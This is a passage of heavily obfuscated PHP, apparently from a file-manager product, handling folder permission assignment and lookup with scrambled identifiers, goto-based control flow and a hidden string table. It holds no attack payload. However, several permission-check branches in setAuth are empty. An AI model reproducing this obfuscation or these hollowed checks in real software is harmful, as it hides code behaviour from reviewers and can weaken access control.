array($D¾„¨Ç); } $c¡ùçŒÉÌ© = array(); foreach ($D¾„¨Ç as $bÀ‹ŒÊÍØ) { if (isset($A¬é¨ƒîã’[$bÀ‹ŒÊÍØ])) { $c¡ùçŒÉÌ©[$bÀ‹ŒÊÍØ] = $A¬é¨ƒîã’[$bÀ‹ŒÊÍØ]; } } goto D§å¾½¬; D§å¾½¬: if (count($c¡ùçŒÉÌ©) == count($D¾„¨Ç)) { return $Bä®ÒÉàŞğ ? $c¡ùçŒÉÌ©[$D¾„¨Ç[0]] : $c¡ùçŒÉÌ©; } $C¶Š°±…Í = $cİöã‚ïÙï[1891]; $f»œ¿ê‰µ = array($cİöã‚ïÙï[397] => array($cİöã‚ïÙï[7], $D¾„¨Ç)); goto AŸÂ½ã½ß„; B¿×Íğš¯: $cİöã‚ïÙï =& $_SERVER[›èö’ù¤]; static $A¬é¨ƒîã’ = array(); $Bä®ÒÉàŞğ = is_array($D¾„¨Ç) ? !1 : !0; goto aø¢Áù˜›³; f¼À´°ùäÂ: } public function setAuth($e¤­ÂŒç¥», $AÇã†ä£½‰) { goto aËŠ¤Î×ó¦; CˆÔ ƒ¸…Ñ: return !0; goto c‡ô¨³Ö; aËŠ¤Î×ó¦: $cÂ¯ëìŠ‡ =& $_SERVER[›èö’ù¤]; $C±®–îß ¸ = Model($cÂ¯ëìŠ‡[1230])->sourceInfo($e¤­ÂŒç¥»); if (!$C±®–îß ¸) { return !1; } goto A÷Íİ´»œ„; A÷Íİ´»œ„: if ($C±®–îß ¸[$cÂ¯ëìŠ‡[406]] != SourceModel::TYPE_GROUP) { return !1; } $f¯¨Š˜²ó = 1; $eÁ·×…®¥æ = $C±®–îß ¸[$cÂ¯ëìŠ‡[499]]; goto EÜì÷¼ªé; EÜì÷¼ªé: if ($eÁ·×…®¥æ != $f¯¨Š˜²ó) { $cæ½Ù²…ï = array($cÂ¯ëìŠ‡[1720] => $eÁ·×…®¥æ); $C‰ÅÂ½¿åí = Model($cÂ¯ëìŠ‡[1806])->field($cÂ¯ëìŠ‡[1551])->where($cæ½Ù²…ï)->select(); $C‰ÅÂ½¿åí = array_to_keyvalue($C‰ÅÂ½¿åí, $cÂ¯ëìŠ‡[33], $cÂ¯ëìŠ‡[1551]); } $e½‚ƒƒâÆ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $c–Ã¾‰ = array(); goto D¬åÆƒ¡Ô; D¬åÆƒ¡Ô: foreach ($AÇã†ä£½‰ as $A»´“è°) { if (!in_array($A»´“è°[$cÂ¯ëìŠ‡[406]], $e½‚ƒƒâÆ)) { show_json(LNG($cÂ¯ëìŠ‡[1892]), !1); } if ($eÁ·×…®¥æ != $f¯¨Š˜²ó) { if ($A»´“è°[$cÂ¯ëìŠ‡[406]] == SourceModel::TYPE_GROUP) { } if ($A»´“è°[$cÂ¯ëìŠ‡[499]] != 0 && !in_array($A»´“è°[$cÂ¯ëìŠ‡[499]], $C‰ÅÂ½¿åí)) { } } if ($A»´“è°[$cÂ¯ëìŠ‡[499]] == 0) { $A»´“è°[$cÂ¯ëìŠ‡[406]] = SourceModel::TYPE_USER; } $c–Ã¾‰[] = array($cÂ¯ëìŠ‡[397] => $e¤­ÂŒç¥», $cÂ¯ëìŠ‡[406] => intval($A»´“è°[$cÂ¯ëìŠ‡[406]]), $cÂ¯ëìŠ‡[499] => intval($A»´“è°[$cÂ¯ëìŠ‡[499]]), $cÂ¯ëìŠ‡[1820] => intval($A»´“è°[$cÂ¯ëìŠ‡[1820]]) ? intval($A»´“è°[$cÂ¯ëìŠ‡[1820]]) : 0, $cÂ¯ëìŠ‡[1874] => intval($A»´“è°[$cÂ¯ëìŠ‡[1874]]) ? intval($A»´“è°[$cÂ¯ëìŠ‡[1874]]) : -1); } $this->where(array($cÂ¯ëìŠ‡[412] => $e¤­ÂŒç¥»))->delete(); $this->addAll($c–Ã¾‰); goto CˆÔ ƒ¸…Ñ; c‡ô¨³Ö: } public function authClear($d“‘™¸«ƒŠ) { $A‘ŠË‰„–Ú =& $_SERVER[›èö’ù¤]; $AÃ®ŠÍŞÆ = Model($A‘ŠË‰„–Ú[1230])->sourceInfo($d“‘™¸«ƒŠ); $cÆà«Åãòà = array($d“‘™¸«ƒŠ); if ($AÃ®ŠÍŞÆ[$A‘ŠË‰„–Ú[405]] == $A‘ŠË‰„–Ú[87]) { $Dß¢×§Õ…â = array($A‘ŠË‰„–Ú[579] => array($A‘ŠË‰„–Ú[539], $AÃ®ŠÍŞÆ[$A‘ŠË‰„–Ú[516]] . $d“‘™¸«ƒŠ . $A‘ŠË‰„–Ú[540])); $cÆà«Åãòà = Model($A‘ŠË‰„–Ú[1230])->field($A‘ŠË‰„–Ú[412])->where($Dß¢×§Õ…â)->getField($A‘ŠË‰„–Ú[397], !0); $cÆà«Åãòà[] = $d“‘™¸«ƒŠ; } $this->where(array($A‘ŠË‰„–Ú[412] => array($A‘ŠË‰„–Ú[413], $cÆà«Åãòà)))->delete(); return !0; } public function getAllChildren($aŒÇà°œôÂ) { goto CÕ£»‚‡¸â; CÕ£»‚‡¸â: $E”‹„ÀÀÎˆ =& $_SERVER[›èö’ù¤]; $c‰‹ÉæŠÇ = Model($E”‹„ÀÀÎˆ[1230])->sourceInfo($aŒÇà°œôÂ); if ($c‰‹ÉæŠÇ[$E”‹„ÀÀÎˆ[405]] != $E”‹„ÀÀÎˆ[87]) { return $this->sourceListAuth(array($aŒÇà°œôÂ)); } goto C¶›îØ½œ¡; B²¸áèô: if (!$EÈ¤…™ïï£) { return array(); } $a‡´øè²ï· = $E”‹„ÀÀÎˆ[1893]; $E°É—¨¸¬ = array($E”‹„ÀÀÎˆ[397] => array($E”‹„ÀÀÎˆ[7], $EÈ¤…™ïï£), $E”‹„ÀÀÎˆ[425] => $E”‹„ÀÀÎˆ[191]); goto fè–è½Ñæ; fß±ºõŠ¬…: if ($c‰‹ÉæŠÇ[$E”‹„ÀÀÎˆ[493]] == $E”‹„ÀÀÎˆ[191] && $c‰‹ÉæŠÇ[$E”‹„ÀÀÎˆ[499]] != $EÀ˜õá„°ƒ) { $EÊïğ´÷¿£ = $this->groupChidldAllRootSource($c‰‹ÉæŠÇ[$E”‹„ÀÀÎˆ[499]]); } $EÈ¤…™ïï£ = $this->field($E”‹„ÀÀÎˆ[397])->group($E”‹„ÀÀÎˆ[397])->select(); $EÈ¤…™ïï£ = array_to_keyvalue($EÈ¤…™ïï£, $E”‹„ÀÀÎˆ[33], $E”‹„ÀÀÎˆ[397]); goto B²¸áèô; dŠ›êàäæ: return $this->sourceListAuth($cÄãÖŒŒ¡¥); goto cªñè”…À‚; fè–è½Ñæ: $c êç¦·‡í = Model($E”‹„ÀÀÎˆ[816])->field($a‡´øè²ï·)->where($E°É—¨¸¬)->select(); $cÄãÖŒŒ¡¥ = array($aŒÇà°œôÂ); foreach ($c êç¦·‡í as $cĞî·¼“²ƒ) { foreach ($EÊïğ´÷¿£ as $Dàï øÖ) { $FËÇŞ„ªÄÆ = $E”‹„ÀÀÎˆ[47] . $Dàï øÖ . $E”‹„ÀÀÎˆ[47]; $AÌºÒºÖ = $cĞî·¼“²ƒ[$E”‹„ÀÀÎˆ[516]] . $cĞî·¼“²ƒ[$E”‹„ÀÀÎˆ[397]] . $E”‹„ÀÀÎˆ[47]; if (strstr($AÌºÒºÖ, $FËÇŞ„ªÄÆ)) { $cÄãÖŒŒ¡¥[] = $cĞî·¼“²ƒ[$E”‹„ÀÀÎˆ[397]]; break; } } } goto dŠ›êàäæ; C¶›îØ½œ¡: if ($c‰‹ÉæŠÇ[$E”‹„ÀÀÎˆ[406]] != SourceModel::TYPE_GROUP) { return array(); } $EÀ˜õá„°ƒ = 1; $EÊïğ´÷¿£ = array($aŒÇà°œôÂ); goto fß±ºõŠ¬…; cªñè”…À‚: } private function sourceListAuth($aÏœàŒÏ«â) { goto A¤ˆòƒùÛÊ; A¤ˆòƒùÛÊ: $bé±Î¯¬ƒ =& $_SERVER[›èö’ù¤]; $b‘‡ÂèºÙÛ = Model($bé±Î¯¬ƒ[1230])->sourceListInfo($aÏœàŒÏ«â, !0); $DŞö œ¢ö˜ = $this->sourceAuthSelect($aÏœàŒÏ«â); goto c¯¡ëÁÚ•; AîååÅîá: array_multisort($d¢ƒŞÛÀÙ, SORT_ASC, $E•“˜¼§´–); return $E•“˜¼§´–; goto F£‡êò‡; c¯¡ëÁÚ•: $E•“˜¼§´– = array(); $d¢ƒŞÛÀÙ = array(); foreach ($b‘‡ÂèºÙÛ as $aÑÃ“Ïò†) { goto D‡ÊÌ÷³Šº; D‡ÊÌ÷³Šº: unset($aÑÃ“Ïò†[$bé±Î¯¬ƒ[449]]); unset($aÑÃ“Ïò†[$bé±Î¯¬ƒ[447]]); unset($aÑÃ“Ïò†[$bé±Î¯¬ƒ[408]]); goto a³˜ƒÇ£Øö; D‘ÖŠÌËãö: $aÑÃ“Ïò†[$bé±Î¯¬ƒ[1894]] = $this->authTargetInfo($BÕùª‡‰Ä÷); $aÑÃ“Ïò†[$bé±Î¯¬ƒ[514]] = rtrim($aÑÃ“Ïò†[$bé±Î¯¬ƒ[520]], $bé±Î¯¬ƒ[8]) . $bé±Î¯¬ƒ[8] . ltrim($aÑÃ“Ïò†[$bé±Î¯¬ƒ[514]], $bé±Î¯¬ƒ[8]); $E•“˜¼§´–[] = $aÑÃ“Ïò†; goto C„è—ÎÀÍ‰; a³˜ƒÇ£Øö: unset($aÑÃ“Ïò†[$bé±Î¯¬ƒ[85]]); $BÕùª‡‰Ä÷ = $DŞö œ¢ö˜[$aÑÃ“Ïò†[$bé±Î¯¬ƒ[397]]]; if (!$BÕùª‡‰Ä÷) { continue; } goto D‘ÖŠÌËãö; C„è—ÎÀÍ‰: $Eºò”„Á¶Ï = count(explode($bé±Î¯¬ƒ[8], trim($aÑÃ“Ïò†[$bé±Î¯¬ƒ[514]], $bé±Î¯¬ƒ[8]))); $d¢ƒŞÛÀÙ[] = $Eºò”„Á¶Ï + ($aÑÃ“Ïò†[$bé±Î¯¬ƒ[29]] == $bé±Î¯¬ƒ[77] ? 0 : 1000); goto B»µ«‹ŠŞé; B»µ«‹ŠŞé: } goto AîååÅîá; F£‡êò‡: } private function groupChidldAllRootSource($fÖÊ«¢ÓÊ) { $F‹˜¥‹§è =& $_SERVER[›èö’ù¤]; $cİêÒğ“âÂ = Model($F‹˜¥‹§è[1895])->groupChildrenAll($fÖÊ«¢ÓÊ); $EçÚ¥£ó‹Û = array($F‹˜¥‹§è[493] => 0, $F‹˜¥‹§è[499] => array($F‹˜¥‹§è[7], $cİêÒğ“âÂ), $F‹˜¥‹§è[406] => SourceModel::TYPE_GROUP); $aÜĞóÄî‰ = Model($F‹˜¥‹§è[816])->field($F‹˜¥‹§è[397])->where($EçÚ¥£ó‹Û)->select(); $aÜĞóÄî‰ = array_to_keyvalue($aÜĞóÄî‰, $F‹˜¥‹§è[33], $F‹˜¥‹§è[397]); return $aÜĞóÄî‰; } private function authTargetInfo($B£¶Œê¸·‹) { goto E³ÜÈŸ¹‘ì; E³ÜÈŸ¹‘ì: $D–ÈÛÔàåò =& $_SERVER[›èö’ù¤]; $D§èÁœìóº = array(); $DÍİëğ…ÂŠ = array(); goto e¦©Š”¥’; e¦©Š”¥’: $dî’‘²–±Ô = 2 << 25; foreach ($B£¶Œê¸·‹ as $cğÓìùé³‹) { goto a…ì Åª; CÎ‚â¢²²ø: if ($cğÓìùé³‹[$D–ÈÛÔàåò[406]] == SourceModel::TYPE_USER && $cğÓìùé³‹[$D–ÈÛÔàåò[499]] == $D–ÈÛÔàåò[191]) { $F×ëŠ«ÉºÊ = 0; } $DÍİëğ…ÂŠ[] = $eø´Ò‡Ğß[$D–ÈÛÔàåò[408]] + $F×ëŠ«ÉºÊ; goto d·Â¯¦ã¢; a…ì Åª: $eø´Ò‡Ğß = Model($D–ÈÛÔàåò[502])->listData($cğÓìùé³‹[$D–ÈÛÔàåò[1820]]); if (!$eø´Ò‡Ğß) { continue; } if ($cğÓìùé³‹[$D–ÈÛÔàåò[406]] == SourceModel::TYPE_USER) { $fÒ¤ñˆù½ß = Model($D–ÈÛÔàåò[508])->getInfoSimpleOuter($cğÓìùé³‹[$D–ÈÛÔàåò[499]]); if ($fÒ¤ñˆù½ß[$D–ÈÛÔàåò[1551]] == $D–ÈÛÔàåò[1109]) { continue; } if ($fÒ¤ñˆù½ß[$D–ÈÛÔàåò[1551]] == $D–ÈÛÔàåò[191]) { $fÒ¤ñˆù½ß[$D–ÈÛÔàåò[28]] = LNG($D–ÈÛÔàåò[1896]); } } else { $fÒ¤ñˆù½ß = Model($D–ÈÛÔàåò[517])->getInfoSimple($cğÓìùé³‹[$D–ÈÛÔàåò[499]]); } goto fáïøä¸Ò›; aŞ×©¼—: $F×ëŠ«ÉºÊ = 0; if ($cğÓìùé³‹[$D–ÈÛÔàåò[406]] == SourceModel::TYPE_GROUP) { $F×ëŠ«ÉºÊ = $dî’‘²–±Ô * 2; } if ($cğÓìùé³‹[$D–ÈÛÔàåò[406]] == SourceModel::TYPE_USER) { $F×ëŠ«ÉºÊ = $dî’‘²–±Ô; } goto CÎ‚â¢²²ø; fáïøä¸Ò›: if (!$fÒ¤ñˆù½ß) { continue; } $fÒ¤ñˆù½ß[$D–ÈÛÔàåò[461]] = $eø´Ò‡Ğß; $D§èÁœìóº[] = $fÒ¤ñˆù½ß; goto aŞ×©¼—; d·Â¯¦ã¢: } array_multisort($DÍİëğ…ÂŠ, SORT_DESC, $D§èÁœìóº); goto dÙá¢ô¨ñì; dÙá¢ô¨ñì: return $D§èÁœìóº; goto E²¢°ïªŞĞ; E²¢°ïªŞĞ: } public function getAllChildrenByUser($eîï‚ï§¬ï, $bîíèìèÔÇ) { goto BÓ·âšÇç—; BÓ·âšÇç—: $fì÷˜Š´„‘ =& $_SERVER[›èö’ù¤]; $aÂŠÆàÈŞ† = Model($fì÷˜Š´„‘[533])->getInfo($bîíèìèÔÇ); if (!$bîíèìèÔÇ || !$eîï‚ï§¬ï || !$aÂŠÆàÈŞ†) { return array(); } goto bêâŸ‰ÓÕ; fµ‚£ªÖ¿‚: return $DÚ²ÚÁñé¯; goto b’èÇÙ¡Ñ­; FØ¨Í°œ‰: if ($DÆ÷Ï¢ÁÓè[$fì÷˜Š´„‘[493]] == $fì÷˜Š´„‘[191] && $DÆ÷Ï¢ÁÓè[$fì÷˜Š´„‘[499]] != $f´ñæåíÛ° && $this->groupContainUser($DÆ÷Ï¢ÁÓè[$fì÷˜Š´„‘[499]], $bîíèìèÔÇ)) { foreach ($aÂŠÆàÈŞ†[$fì÷˜Š´„‘[1897]] as $eœÛ˜¼ğä) { $d‚¥éÊù’‹ = Model($fì÷˜Š´„‘[517])->getInfo($eœÛ˜¼ğä[$fì÷˜Š´„‘[1720]]); $CâÒÙ‚®© = Model($fì÷˜Š´„‘[533])->getInfoSimpleOuter($bîíèìèÔÇ); $CâÒÙ‚®©[$fì÷˜Š´„‘[461]] = $eœÛ˜¼ğä[$fì÷˜Š´„‘[408]]; if (Model($fì÷˜Š´„‘[502])->authCheckAction($eœÛ˜¼ğä[$fì÷˜Š´„‘[408]][$fì÷˜Š´„‘[408]], $fì÷˜Š´„‘[1740])) { continue; } $BËÄ©ğÈÃ = array($fì÷˜Š´„‘[28] => $fì÷˜Š´„‘[1503] . $d‚¥éÊù’‹[$fì÷˜Š´„‘[28]], $fì÷˜Š´„‘[397] => $d‚¥éÊù’‹[$fì÷˜Š´„‘[85]][$fì÷˜Š´„‘[397]], $fì÷˜Š´„‘[76] => KodIO::make($d‚¥éÊù’‹[$fì÷˜Š´„‘[85]][$fì÷˜Š´„‘[397]]), $fì÷˜Š´„‘[493] => $fì÷˜Š´„‘[191], $fì÷˜Š´„‘[406] => $fì÷˜Š´„‘[510], $fì÷˜Š´„‘[29] => $fì÷˜Š´„‘[543], $fì÷˜Š´„‘[514] => $d‚¥éÊù’‹[$fì÷˜Š´„‘[521]], $fì÷˜Š´„‘[1720] => $d‚¥éÊù’‹[$fì÷˜Š´„‘[1720]], $fì÷˜Š´„‘[518] => $d‚¥éÊù’‹[$fì÷˜Š´„‘[493]], $fì÷˜Š´„‘[1894] => array($CâÒÙ‚®©)); $dƒƒ­ˆ£Í‹[$BËÄ©ğÈÃ[$fì÷˜Š´„‘[397]]] = $BËÄ©ğÈÃ; } } $DÚ²ÚÁñé¯ = array(); $d‚²°–ïˆ‹ = $this->getAllChildren($eîï‚ï§¬ï); goto bñİŞ—Ë×; bñİŞ—Ë×: foreach ($d‚²°–ïˆ‹ as $a£ì¥¿”§÷) { $e¸ÙñÁËÊ• = !1; foreach ($a£ì¥¿”§÷[$fì÷˜Š´„‘[1894]] as $f©‹Âàî†) { if ($f©‹Âàî†[$fì÷˜Š´„‘[1551]]) { if ($f©‹Âàî†[$fì÷˜Š´„‘[1551]] == $bîíèìèÔÇ) { $e¸ÙñÁËÊ• = !0; break; } } if ($f©‹Âàî†[$fì÷˜Š´„‘[1720]]) { if ($this->groupContainUser($f©‹Âàî†[$fì÷˜Š´„‘[1720]], $bîíèìèÔÇ)) { $e¸ÙñÁËÊ• = !0; break; } } } if ($e¸ÙñÁËÊ•) { $DÚ²ÚÁñé¯[] = $a£ì¥¿”§÷; } $D¾¬Æ„ò— = $a£ì¥¿”§÷[$fì÷˜Š´„‘[397]]; if (isset($dƒƒ­ˆ£Í‹[$D¾¬Æ„ò—])) { $a£ì¥¿”§÷[$fì÷˜Š´„‘[1894]][] = $dƒƒ­ˆ£Í‹[$D¾¬Æ„ò—][0]; $dƒƒ­ˆ£Í‹[$D¾¬Æ„ò—] = !1; } } $dƒƒ­ˆ£Í‹ = array_filter(array_values($dƒƒ­ˆ£Í‹)); $DÚ²ÚÁñé¯ = array_merge($dƒƒ­ˆ£Í‹, $DÚ²ÚÁñé¯); goto fµ‚£ªÖ¿‚; bêâŸ‰ÓÕ: $DÆ÷Ï¢ÁÓè = Model($fì÷˜Š´„‘[1230])->sourceInfo($eîï‚ï§¬ï); $dƒƒ­ˆ£Í‹ = array(); $f´ñæåíÛ° = 1; goto FØ¨Í°œ‰; b’èÇÙ¡Ñ­: } public function setAllChildrenByUser($BšÔâ†èùÀ, $FÍĞÔŒáö, $BÁ‚é…÷İé) { $c§Üµ‘¸‚¢ =& $_SERVER[›èö’ù¤]; $D³¿İŒ¬•Ü = $this->getAllChildrenByUser($BšÔâ†èùÀ, $FÍĞÔŒáö); if (!$BÁ‚é…÷İé || !$D³¿İŒ¬•Ü) { return !1; } foreach ($D³¿İŒ¬•Ü as $B–‚İÌ Ôî) { $bÀçÙÅ½Ïç = array(); foreach ($B–‚İÌ Ôî[$c§Üµ‘¸‚¢[1894]] as $f²…ˆÑâ÷•) { $D«„ø‹Äîª = $f²…ˆÑâ÷•[$c§Üµ‘¸‚¢[461]]; $B¡Û®Î™–ã = $f²…ˆÑâ÷•[$c§Üµ‘¸‚¢[1551]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $aí›ôàôˆ¾ = $f²…ˆÑâ÷•[$c§Üµ‘¸‚¢[1551]] ? $f²…ˆÑâ÷•[$c§Üµ‘¸‚¢[1551]] : $f²…ˆÑâ÷•[$c§Üµ‘¸‚¢[1720]]; if ($f²…ˆÑâ÷•[$c§Üµ‘¸‚¢[1551]] && $f²…ˆÑâ÷•[$c§Üµ‘¸‚¢[1551]] == $FÍĞÔŒáö) { continue; } $bÀçÙÅ½Ïç[] = array($c§Üµ‘¸‚¢[397] => $B–‚İÌ Ôî[$c§Üµ‘¸‚¢[397]], $c§Üµ‘¸‚¢[406] => $B¡Û®Î™–ã, $c§Üµ‘¸‚¢[499] => intval($aí›ôàôˆ¾), $c§Üµ‘¸‚¢[1820] => isset($D«„ø‹Äîª[$c§Üµ‘¸‚¢[395]]) ? intval($D«„ø‹Äîª[$c§Üµ‘¸‚¢[395]]) : 0, $c§Üµ‘¸‚¢[1874] => isset($D«„ø‹Äîª[$c§Üµ‘¸‚¢[1874]]) ? intval($D«„ø‹Äîª[$c§Üµ‘¸‚¢[1874]]) : -1); } $bÀçÙÅ½Ïç[] = array($c§Üµ‘¸‚¢[397] => $B–‚İÌ Ôî[$c§Üµ‘¸‚¢[397]], $c§Üµ‘¸‚¢[406] => SourceModel::TYPE_USER, $c§Üµ‘¸‚¢[499] => intval($FÍĞÔŒáö), $c§Üµ‘¸‚¢[1820] => intval($BÁ‚é…÷İé), $c§Üµ‘¸‚¢[1874] => -1); $this->where(array($c§Üµ‘¸‚¢[412] => $B–‚İÌ Ôî[$c§Üµ‘¸‚¢[397]]))->delete(); $this->addAll($bÀçÙÅ½Ïç); } return !0; } public function get($Dã¸…¤ˆ™Ã) { $Fñ‚’ô”¡ˆ = $this->getSourceList(array($Dã¸…¤ˆ™Ã), !0); return $Fñ‚’ô”¡ˆ[0]; } public function getSourceList($Dº±‡¡¦Ü’, $A˜¼øêğÓ = false, $Eìë¬œëƒö = false) { goto Aäùà·„øœ; eŠ‘ÅËÚ½î: $Dë±÷í÷ßò = $this->userIsRoot($Eìë¬œëƒö); $aÔç™ŒÒã³ = AuthModel::authAll(); $EÊˆØÉœ¤† = array($aâÙ‡¸°êª[409] => $aÔç™ŒÒã³, $aâÙ‡¸°êª[1899] => array($aâÙ‡¸°êª[414] => 0, $aâÙ‡¸°êª[1726] => $aÔç™ŒÒã³, $aâÙ‡¸°êª[415] => LNG($aâÙ‡¸°êª[1900]), $aâÙ‡¸°êª[1742] => $aâÙ‡¸°êª[1901])); goto cõñÙ˜ÊÌ; cõñÙ˜ÊÌ: $CØ¹®ÎÊñ² = array(); foreach ($A˜¼øêğÓ as $BìÎÅˆòàö => $B×ÉŞ¾ò¢µ) { if ($Dë±÷í÷ßò) { $CØ¹®ÎÊñ²[$BìÎÅˆòàö] = $EÊˆØÉœ¤†; continue; } $CØ¹®ÎÊñ²[$BìÎÅˆòàö] = $this->makeSourceAuth($B×ÉŞ¾ò¢µ, $a”ÏÕ†¼¦í, $Eìë¬œëƒö); } return $CØ¹®ÎÊñ²; goto A Š±Õª‡¥; cëœªæ…Í´: $cˆ×éÕĞÙ‹ = $this->sourceAuthSelect($fÇ‡Úê¥¨Á); $a”ÏÕ†¼¦í = array(); foreach ($fÇ‡Úê¥¨Á as $BìÎÅˆòàö) { if (isset($cˆ×éÕĞÙ‹[$BìÎÅˆòàö])) { $a”ÏÕ†¼¦í[$BìÎÅˆòàö] = $cˆ×éÕĞÙ‹[$BìÎÅˆòàö]; } } goto eŠ‘ÅËÚ½î; dÚ‘İ˜“çİ: if (!$A˜¼øêğÓ && count($Dº±‡¡¦Ü’) == 1) { $A˜¼øêğÓ = array(); $A˜¼øêğÓ[$Dº±‡¡¦Ü’[0]] = $bÑôÇ²…ßƒ->sourceInfo($Dº±‡¡¦Ü’[0]); } if (!$A˜¼øêğÓ) { $CìÉäËªƒÁ = array($aâÙ‡¸°êª[412] => array($aâÙ‡¸°êª[413], $Dº±‡¡¦Ü’)); $A˜¼øêğÓ = $bÑôÇ²…ßƒ->field($aâÙ‡¸°êª[1898])->where($CìÉäËªƒÁ)->select(); $A˜¼øêğÓ = array_to_keyvalue($A˜¼øêğÓ, $aâÙ‡¸°êª[397]); } $fÇ‡Úê¥¨Á = $Dº±‡¡¦Ü’; goto BŞĞµö¯ùŞ; Aäùà·„øœ: $aâÙ‡¸°êª =& $_SERVER[›èö’ù¤]; if (!$Dº±‡¡¦Ü’) { return array(); } $bÑôÇ²…ßƒ = Model($aâÙ‡¸°êª[1230]); goto dÚ‘İ˜“çİ; BŞĞµö¯ùŞ: foreach ($A˜¼øêğÓ as $AÚğ§Ü·£ => $D·ÙÒÀ‹–‰) { $b’âšíçˆ = $bÑôÇ²…ßƒ->parentLevelArray($D·ÙÒÀ‹–‰[$aâÙ‡¸°êª[516]]); $fÇ‡Úê¥¨Á = array_merge($fÇ‡Úê¥¨Á, array($AÚğ§Ü·£), array_reverse($b’âšíçˆ)); } $fÇ‡Úê¥¨Á = array_values(array_unique($fÇ‡Úê¥¨Á)); if (!$fÇ‡Úê¥¨Á) { return array(); } goto cëœªæ…Í´; A Š±Õª‡¥: } public function authDeepCheck($c‰Ó¡ Ö‚†, $cÚß½Ò¾¤˜ = false) { goto DÓµ²ŒÄÂ…; cÀáë¢‘Ûø: if (!in_array($c‰Ó¡ Ö‚†, $B¾ãŠ¤¹®[$aßªİ«Íñ×[1902]])) { return !1; } $Eº¨‘Ğ‚±† = array(); foreach ($B¾ãŠ¤¹®[$aßªİ«Íñ×[1903]] as $FóçôİåÏ¿ => $C®®Ø…‚²ã) { if (!in_array($c‰Ó¡ Ö‚†, $C®®Ø…‚²ã)) { continue; } $Eº¨‘Ğ‚±†[] = $FóçôİåÏ¿; } goto dê©—–”çÏ; dê©—–”çÏ: if (!$Eº¨‘Ğ‚±†) { return !1; } $AíÃÍ‰ë¾° = $Eº¨‘Ğ‚±† ? $Eº¨‘Ğ‚±†[0] : $c‰Ó¡ Ö‚†; return array($aßªİ«Íñ×[409] => -1, $aßªİ«Íñ×[461] => array($aßªİ«Íñ×[414] => $aßªİ«Íñ×[1109], $aßªİ«Íñ×[1726] => $aßªİ«Íñ×[191], $aßªİ«Íñ×[415] => LNG($aßªİ«Íñ×[1904]), $aßªİ«Íñ×[1742] => $aßªİ«Íñ×[1905]), $aßªİ«Íñ×[1906] => LNG($aßªİ«Íñ×[1907]), $aßªİ«Íñ×[1908] => $this->sourceAuthInfo($AíÃÍ‰ë¾°)); goto B°ğ´ÇĞâ; DÓµ²ŒÄÂ…: $aßªİ«Íñ× =& $_SERVER[›èö’ù¤]; $cÚß½Ò¾¤˜ = $cÚß½Ò¾¤˜ ? $cÚß½Ò¾¤˜ : USER_ID; $B¾ãŠ¤¹® = $this->makeAuthDeep($cÚß½Ò¾¤˜); goto cÀáë¢‘Ûø; B°ğ´ÇĞâ: } protected function makeAuthDeep($e–£œŠ¿Í¤ = false) { goto aÇö†İ³Æ; aŠÙƒÑß: $A½î‘ºÉè– = $eÚˆœÏ£ ©; $böµÒÜÅ‹¬ = Model($Bµ¼ã¤Ö®ª[1230]); $FÎº‡½öæ = Model($Bµ¼ã¤Ö®ª[517]); goto FåŒ¨Ï¹ö“; FØ©‘‰îÁí: if ($eÚˆœÏ£ ©) { $E¨è¿£î·  = array(array($Bµ¼ã¤Ö®ª[406] => SourceModel::TYPE_USER, $Bµ¼ã¤Ö®ª[499] => $e–£œŠ¿Í¤), array($Bµ¼ã¤Ö®ª[406] => SourceModel::TYPE_GROUP, $Bµ¼ã¤Ö®ª[499] => array($Bµ¼ã¤Ö®ª[413], $eÚˆœÏ£ ©)), $Bµ¼ã¤Ö®ª[983] => $Bµ¼ã¤Ö®ª[1812]); } $c´ìˆÅ»ï = $this->field($Bµ¼ã¤Ö®ª[1910])->where($E¨è¿£î· )->select(); $a¼Šõ—ÇĞÈ = array(); goto fÕ½ÏïÆ‡¾; FåŒ¨Ï¹ö“: $Aæù­°Ñ«¼ = array(); $E„º–ÁàÙ® = array(); $B¡²îØÔŒ¿ = array(); goto dáõº§“¨; CÁÖø‘ê: if (isset($C æ¥¸Ù‚®[$e–£œŠ¿Í¤])) { return $C æ¥¸Ù‚®[$e–£œŠ¿Í¤]; } $b¡Ÿ·Š‚²ø = Model($Bµ¼ã¤Ö®ª[1909])->listData(); $døá“˜£³ì = array(); goto EÈ‹‰Šº˜â; fÕ½ÏïÆ‡¾: $DÂÔÑÖµïĞ = array_to_keyvalue_group($c´ìˆÅ»ï, $Bµ¼ã¤Ö®ª[397]); foreach ($DÂÔÑÖµïĞ as $AãÏè­•ÒÄ => $e´µÂ‡ÌØß) { $câ²¨õ¨‡ = $this->authArrayCheck($e´µÂ‡ÌØß, $e–£œŠ¿Í¤); if ($câ²¨õ¨‡[$Bµ¼ã¤Ö®ª[409]] > 0) { $a¼Šõ—ÇĞÈ[] = $AãÏè­•ÒÄ . $Bµ¼ã¤Ö®ª[33]; } } $Eâ†ÆÊ„¼ = array(); goto aŠÙƒÑß; cï”î˜à¯‹: foreach ($A½î‘ºÉè– as $EõÄŠËò—) { $b¥òµÉ‰ºè = $FÎº‡½öæ->getInfo($EõÄŠËò—); $Eâ†ÆÊ„¼[] = $b¥òµÉ‰ºè[$Bµ¼ã¤Ö®ª[85]][$Bµ¼ã¤Ö®ª[397]]; $B¡²îØÔŒ¿[$EõÄŠËò—] = $b¥òµÉ‰ºè[$Bµ¼ã¤Ö®ª[85]][$Bµ¼ã¤Ö®ª[397]]; $FØ¼ó°ğĞ[$EõÄŠËò—] = $böµÒÜÅ‹¬->parentLevelArray($b¥òµÉ‰ºè[$Bµ¼ã¤Ö®ª[516]]); } foreach ($Aæù­°Ñ«¼ as $FòâÃ·¹‘® => $Dß÷Æİµê) { $d´æ“»Ü‘õ = $E„º–ÁàÙ®[$FòâÃ·¹‘®]; if (!$d´æ“»Ü‘õ || !$B¡²îØÔŒ¿[$d´æ“»Ü‘õ]) { continue; } $DÕÛ÷†§¾œ = array(); foreach ($FØ¼ó°ğĞ[$d´æ“»Ü‘õ] as $EõÄŠËò—) { $DÕÛ÷†§¾œ[] = $B¡²îØÔŒ¿[$EõÄŠËò—]; } $Aæù­°Ñ«¼[$FòâÃ·¹‘®] = array_merge($DÕÛ÷†§¾œ, $Dß÷Æİµê); } $Eâ†ÆÊ„¼ = array_values(array_unique($Eâ†ÆÊ„¼)); goto eÃİÖ‘Ø¿²; aÇö†İ³Æ: $Bµ¼ã¤Ö®ª =& $_SERVER[›èö’ù¤]; static $C æ¥¸Ù‚® = array(); $e–£œŠ¿Í¤ = $e–£œŠ¿Í¤ ? $e–£œŠ¿Í¤ : USER_ID; goto 